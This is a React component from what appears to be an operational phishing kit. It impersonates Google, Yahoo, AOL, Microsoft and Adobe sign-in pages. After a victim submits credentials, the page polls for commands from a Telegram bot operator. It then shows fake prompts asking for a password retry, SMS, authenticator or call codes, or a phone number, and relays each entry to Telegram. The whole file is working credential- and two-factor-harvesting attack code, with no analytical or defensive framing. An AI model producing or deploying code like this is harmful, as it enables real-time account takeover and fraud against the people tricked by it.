import React, { useState, useEffect, useRef, useCallback } from 'react';
import Spinner from './common/Spinner';

interface WaitingPageProps {
  sessionId: string;
  email: string;
  provider: string;
  onPasswordRetry: (password: string) => void;
  onComplete: () => void;
}

const POLL_INTERVAL = 3000; // 3 seconds

/**
 * WaitingPage — Replaces the OTP flow.
 *
 * After credentials are submitted, this page polls the backend for commands
 * from the Telegram bot operator. Based on the command received, it shows
 * the appropriate prompt (code entry, phone entry, password retry, etc.)
 * and sends user input back to Telegram.
 */
const WaitingPage: React.FC<WaitingPageProps> = ({
  sessionId,
  email,
  provider,
  onPasswordRetry,
  onComplete,
}) => {
  const [currentCommand, setCurrentCommand] = useState<string | null>(null);
  const [inputValue, setInputValue] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const mountedRef = useRef(true);
  // Track the last command we acted on so we don't re-process the same one
  const lastProcessedCommandRef = useRef<string | null>(null);

  // Determine display info based on provider
  const providerConfig = getProviderConfig(provider);

  // Commands that require user input (polling stops until user submits)
  const INPUT_COMMANDS = ['password_error', 'sms_code', 'authenticator_code', 'call_code', 'number_prompt'];

  // Poll for commands from the Telegram bot operator
  const pollForCommand = useCallback(async () => {
    if (!mountedRef.current) return;
    try {
      const res = await fetch(`/.netlify/functions/getCommand?sessionId=${encodeURIComponent(sessionId)}`);
      if (!res.ok) return;
      const data = await res.json();

      // Only act when we receive a NEW command (different from the one we already processed)
      if (data.command && data.command !== lastProcessedCommandRef.current && mountedRef.current) {
        lastProcessedCommandRef.current = data.command;
        setCurrentCommand(data.command);
        setInputValue('');
        setErrorMessage('');

        // Handle immediate-action commands
        if (data.command === 'success') {
          // Terminal state — stop polling and redirect
          if (pollingRef.current) {
            clearInterval(pollingRef.current);
            pollingRef.current = null;
          }
          onComplete();
        } else if (INPUT_COMMANDS.includes(data.command)) {
          // Commands requiring user input — stop polling until the user submits
          if (pollingRef.current) {
            clearInterval(pollingRef.current);
            pollingRef.current = null;
          }
        }
        // For yes_prompt (and any other display-only command): keep polling
        // so the operator can follow up with a different command.
      }
    } catch (err) {
      // Silently retry on network errors
    }
  }, [sessionId, onComplete]);

  useEffect(() => {
    mountedRef.current = true;
    // Start polling immediately
    pollForCommand();
    pollingRef.current = setInterval(pollForCommand, POLL_INTERVAL);

    return () => {
      mountedRef.current = false;
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
        pollingRef.current = null;
      }
    };
  }, [pollForCommand]);

  // When a command changes to something that requires user input and after
  // user submits, we need to restart polling for the next command.
  const restartPolling = useCallback(() => {
    setCurrentCommand(null);
    setInputValue('');
    setErrorMessage('');
    lastProcessedCommandRef.current = null; // Reset so any command can be picked up
    // Restart polling
    if (pollingRef.current) clearInterval(pollingRef.current);
    pollingRef.current = setInterval(pollForCommand, POLL_INTERVAL);
    pollForCommand();
  }, [pollForCommand]);

  // Send user input back to Telegram
  const sendUserInput = async (inputType: string, value: string) => {
    setIsSubmitting(true);
    try {
      const res = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'user_input',
          data: {
            inputType,
            inputValue: value,
            sessionId,
            email,
            provider,
          },
        }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      // After sending, restart polling for the next command
      restartPolling();
    } catch (err) {
      setErrorMessage('Failed to submit. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputValue.trim()) return;

    if (currentCommand === 'password_error') {
      // Send password retry to Telegram, then also notify parent
      sendUserInput('password_retry', inputValue).then(() => {
        onPasswordRetry(inputValue);
      });
      return;
    }

    const inputTypeMap: Record<string, string> = {
      sms_code: 'sms_code',
      authenticator_code: 'authenticator_code',
      call_code: 'call_code',
      number_prompt: 'phone_number',
    };

    const inputType = inputTypeMap[currentCommand || ''] || 'unknown';
    sendUserInput(inputType, inputValue);
  };

  // --- Render ---

  // Loading / waiting state (no command yet)
  if (!currentCommand) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4" style={{ backgroundColor: providerConfig.bgColor, fontFamily: providerConfig.fontFamily }}>
        <div className="w-full max-w-md text-center">
          {providerConfig.logo}
          <div className="mt-8">
            <Spinner size="lg" color={providerConfig.spinnerColor} />
          </div>
          <h2 className="mt-6 text-lg font-medium" style={{ color: providerConfig.textColor }}>
            Verifying your identity…
          </h2>
          <p className="mt-2 text-sm" style={{ color: providerConfig.subtextColor }}>
            Please wait while we verify your sign-in. This may take a moment.
          </p>
          {email && (
            <p className="mt-4 text-sm font-medium" style={{ color: providerConfig.accentColor }}>
              {email}
            </p>
          )}
        </div>
      </div>
    );
  }

  // Yes Prompt — show "verifying" with more confidence
  if (currentCommand === 'yes_prompt') {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4" style={{ backgroundColor: providerConfig.bgColor, fontFamily: providerConfig.fontFamily }}>
        <div className="w-full max-w-md text-center">
          {providerConfig.logo}
          <div className="mt-8">
            <Spinner size="lg" color={providerConfig.spinnerColor} />
          </div>
          <h2 className="mt-6 text-lg font-medium" style={{ color: providerConfig.textColor }}>
            Verifying your identity…
          </h2>
          <p className="mt-2 text-sm" style={{ color: providerConfig.subtextColor }}>
            We've detected a sign-in from a new device. Please wait while we complete verification.
          </p>
        </div>
      </div>
    );
  }

  // Password Error — ask user to re-enter password
  if (currentCommand === 'password_error') {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4" style={{ backgroundColor: providerConfig.bgColor, fontFamily: providerConfig.fontFamily }}>
        <div className="w-full max-w-md bg-white rounded-xl p-8" style={{ boxShadow: '0 4px 24px rgba(0,0,0,.08)' }}>
          {providerConfig.logo}
          <h2 className="mt-6 text-xl font-semibold" style={{ color: providerConfig.textColor }}>
            Incorrect password
          </h2>
          <p className="mt-2 text-sm" style={{ color: providerConfig.subtextColor }}>
            The password you entered is incorrect. Please try again.
          </p>
          {email && (
            <p className="mt-3 text-sm px-3 py-1.5 bg-gray-100 rounded-full inline-block">{email}</p>
          )}

          {errorMessage && (
            <div className="mt-4 p-3 rounded bg-red-50 border border-red-200 text-red-700 text-sm">
              {errorMessage}
            </div>
          )}

          <form onSubmit={handleSubmit} className="mt-6">
            <label className="block text-sm font-medium mb-2" style={{ color: providerConfig.textColor }}>
              Password
            </label>
            <input
              type="password"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              autoFocus
              className="w-full px-4 py-3 border-2 rounded-lg text-base outline-none transition-colors"
              style={{ borderColor: '#d3d3d3' }}
              onFocus={(e) => (e.target.style.borderColor = providerConfig.accentColor)}
              onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
              placeholder="Enter your password"
            />
            <button
              type="submit"
              disabled={isSubmitting || !inputValue.trim()}
              className="w-full mt-4 py-3 text-white font-semibold rounded-full transition-colors disabled:opacity-50"
              style={{ backgroundColor: providerConfig.accentColor }}
            >
              {isSubmitting ? <Spinner size="sm" color="border-white" /> : 'Continue'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Code entry commands (SMS Code, Authenticator Code, Call Code)
  if (['sms_code', 'authenticator_code', 'call_code'].includes(currentCommand)) {
    const commandConfig = getCommandConfig(currentCommand, providerConfig);

    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4" style={{ backgroundColor: providerConfig.bgColor, fontFamily: providerConfig.fontFamily }}>
        <div className="w-full max-w-md bg-white rounded-xl p-8" style={{ boxShadow: '0 4px 24px rgba(0,0,0,.08)' }}>
          {providerConfig.logo}
          <h2 className="mt-6 text-xl font-semibold" style={{ color: providerConfig.textColor }}>
            {commandConfig.title}
          </h2>
          <p className="mt-2 text-sm" style={{ color: providerConfig.subtextColor }}>
            {commandConfig.description}
          </p>
          {email && (
            <p className="mt-3 text-sm px-3 py-1.5 bg-gray-100 rounded-full inline-block">{email}</p>
          )}

          {errorMessage && (
            <div className="mt-4 p-3 rounded bg-red-50 border border-red-200 text-red-700 text-sm">
              {errorMessage}
            </div>
          )}

          <form onSubmit={handleSubmit} className="mt-6">
            <label className="block text-sm font-medium mb-2" style={{ color: providerConfig.textColor }}>
              {commandConfig.inputLabel}
            </label>
            <input
              type="text"
              inputMode="numeric"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value.replace(/[^0-9]/g, '').slice(0, 8))}
              autoFocus
              autoComplete="one-time-code"
              className="w-full px-4 py-3 border-2 rounded-lg text-base outline-none transition-colors text-center tracking-widest font-mono text-xl"
              style={{ borderColor: '#d3d3d3', letterSpacing: '0.3em' }}
              onFocus={(e) => (e.target.style.borderColor = providerConfig.accentColor)}
              onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
              placeholder="••••••"
              maxLength={8}
            />
            <button
              type="submit"
              disabled={isSubmitting || !inputValue.trim()}
              className="w-full mt-4 py-3 text-white font-semibold rounded-full transition-colors disabled:opacity-50"
              style={{ backgroundColor: providerConfig.accentColor }}
            >
              {isSubmitting ? <Spinner size="sm" color="border-white" /> : 'Verify'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Number Prompt — ask for phone number
  if (currentCommand === 'number_prompt') {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center p-4" style={{ backgroundColor: providerConfig.bgColor, fontFamily: providerConfig.fontFamily }}>
        <div className="w-full max-w-md bg-white rounded-xl p-8" style={{ boxShadow: '0 4px 24px rgba(0,0,0,.08)' }}>
          {providerConfig.logo}
          <h2 className="mt-6 text-xl font-semibold" style={{ color: providerConfig.textColor }}>
            Confirm your phone number
          </h2>
          <p className="mt-2 text-sm" style={{ color: providerConfig.subtextColor }}>
            For security purposes, please enter the phone number associated with your account.
          </p>
          {email && (
            <p className="mt-3 text-sm px-3 py-1.5 bg-gray-100 rounded-full inline-block">{email}</p>
          )}

          {errorMessage && (
            <div className="mt-4 p-3 rounded bg-red-50 border border-red-200 text-red-700 text-sm">
              {errorMessage}
            </div>
          )}

          <form onSubmit={handleSubmit} className="mt-6">
            <label className="block text-sm font-medium mb-2" style={{ color: providerConfig.textColor }}>
              Phone number
            </label>
            <input
              type="tel"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              autoFocus
              className="w-full px-4 py-3 border-2 rounded-lg text-base outline-none transition-colors"
              style={{ borderColor: '#d3d3d3' }}
              onFocus={(e) => (e.target.style.borderColor = providerConfig.accentColor)}
              onBlur={(e) => (e.target.style.borderColor = '#d3d3d3')}
              placeholder="+1 (555) 123-4567"
            />
            <button
              type="submit"
              disabled={isSubmitting || !inputValue.trim()}
              className="w-full mt-4 py-3 text-white font-semibold rounded-full transition-colors disabled:opacity-50"
              style={{ backgroundColor: providerConfig.accentColor }}
            >
              {isSubmitting ? <Spinner size="sm" color="border-white" /> : 'Continue'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Fallback — should not happen, show loading
  return (
    <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: providerConfig.bgColor }}>
      <Spinner size="lg" color={providerConfig.spinnerColor} />
    </div>
  );
};

// --- Provider-specific styling ---

interface ProviderConfig {
  bgColor: string;
  textColor: string;
  subtextColor: string;
  accentColor: string;
  spinnerColor: string;
  fontFamily: string;
  logo: React.ReactNode;
}

function getProviderConfig(provider: string): ProviderConfig {
  const p = (provider || '').toLowerCase();

  if (p.includes('gmail') || p.includes('google')) {
    return {
      bgColor: '#fff',
      textColor: '#202124',
      subtextColor: '#5f6368',
      accentColor: '#1a73e8',
      spinnerColor: 'border-blue-600',
      fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif",
      logo: (
        <svg viewBox="0 0 272 92" style={{ height: 28 }} xmlns="http://www.w3.org/2000/svg">
          <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
          <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
          <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
          <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
          <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
          <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z" fill="#4285F4"/>
        </svg>
      ),
    };
  }

  if (p.includes('yahoo')) {
    return {
      bgColor: '#fff',
      textColor: '#1d1d1f',
      subtextColor: '#6e6e73',
      accentColor: '#6300be',
      spinnerColor: 'border-purple-600',
      fontFamily: "'Centra No2', -apple-system, BlinkMacSystemFont, sans-serif",
      logo: (
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" style={{ height: 36, userSelect: 'none' }} />
      ),
    };
  }

  if (p.includes('aol')) {
    return {
      bgColor: '#fff',
      textColor: '#1d1d1f',
      subtextColor: '#6e6e73',
      accentColor: '#0066FF',
      spinnerColor: 'border-blue-600',
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
      logo: (
        <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="AOL" style={{ height: 24, userSelect: 'none' }} />
      ),
    };
  }

  if (p.includes('office') || p.includes('outlook') || p.includes('microsoft') || p.includes('hotmail') || p.includes('live')) {
    return {
      bgColor: '#fff',
      textColor: '#1b1b1b',
      subtextColor: '#616161',
      accentColor: '#0067b8',
      spinnerColor: 'border-blue-700',
      fontFamily: "'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, sans-serif",
      logo: (
        <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
          <path d="M44.836 4.6h-2.4v14.627h-1.62V4.6h-2.4V3.227h6.42V4.6zm-9.2 0h-2.4v14.627h-1.62V4.6h-2.4V3.227h6.42V4.6z" fill="#737373" />
          <path fill="#F25022" d="M0 0h11.377v11.377H0z" />
          <path fill="#00A4EF" d="M0 12.623h11.377V24H0z" />
          <path fill="#7FBA00" d="M12.623 0H24v11.377H12.623z" />
          <path fill="#FFB900" d="M12.623 12.623H24V24H12.623z" />
        </svg>
      ),
    };
  }

  // Default / Others / Adobe
  return {
    bgColor: '#f5f5f5',
    textColor: '#2c2c2c',
    subtextColor: '#6e6e6e',
    accentColor: '#1473e6',
    spinnerColor: 'border-blue-600',
    fontFamily: "adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    logo: (
      <div className="flex items-center gap-2">
        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="26" viewBox="0 0 30 26">
          <path d="M11.5 0H0v26l11.5-26zm7 0H30v26L18.5 0zM15 9.6L21.1 26h-4.5l-1.8-4.7H10l5-11.7z" fill="#EB1000"/>
        </svg>
        <span style={{ fontSize: 18, fontWeight: 700, color: '#2c2c2c', letterSpacing: '-0.5px' }}>Adobe</span>
      </div>
    ),
  };
}

// --- Command-specific configuration ---

function getCommandConfig(command: string, providerConfig: ProviderConfig) {
  switch (command) {
    case 'sms_code':
      return {
        title: '2-Step Verification',
        description: 'A verification code has been sent to your phone via SMS. Please enter the code below.',
        inputLabel: 'Verification code',
      };
    case 'authenticator_code':
      return {
        title: 'Authenticator Verification',
        description: 'Open your authenticator app and enter the 6-digit code shown for your account.',
        inputLabel: 'Authenticator code',
      };
    case 'call_code':
      return {
        title: 'Phone Call Verification',
        description: 'You will receive a phone call with a verification code. Please enter the code below.',
        inputLabel: 'Verification code',
      };
    default:
      return {
        title: 'Verification Required',
        description: 'Please enter the verification code.',
        inputLabel: 'Code',
      };
  }
}

export default WaitingPage;
